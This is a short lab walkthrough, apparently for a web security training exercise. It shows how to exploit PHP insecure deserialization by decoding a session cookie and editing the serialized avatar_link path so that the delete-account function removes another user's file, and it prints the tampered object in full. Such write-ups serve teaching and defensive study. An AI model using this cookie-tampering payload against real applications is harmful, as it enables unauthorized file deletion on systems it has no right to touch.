# Using application functionality to exploit insecure deserialization

 This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

You also have access to a backup account: gregg:rosebud

### solution
- start by logging in using **wiener:peter** creds

<img src=./images/Capture0.PNG alt="img0" width="700"/>

- we see this panel

<img src=./images/Capture7.PNG alt="img7" width="700"/>

- as we want to delete a file, we will be intersersted in delete account function
- we intercept this request and we see that

<img src=./images/Capture8.PNG alt="img8" width="700"/>

- we note the session cookie may be interesting: `Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4OXo3ZHZrZms4MWRwbzk3YmJyemQ5ZmhsbW15cGR0bSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d`
- go to cyberchef and decode it

<img src=./images/Capture9.PNG alt="img9" width="700"/>

- The value after decoding is: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"x9z7dvkfk81dpo97bbrzd9fhlmmypdtm";s:11:"avatar_link";s:19:"users/wiener/avatar";}`
- notice that there's avatar_link attribute. It's what will be deleted, so let's change it to `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"x9z7dvkfk81dpo97bbrzd9fhlmmypdtm";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`
- notice that i made the string size 23 cuz u must write the right size.
- encode it again and send it to the request.
- The wiener account is deleted and **morale.txt** files also is deleted
- Congratzzzzzzzzzzzzzzzz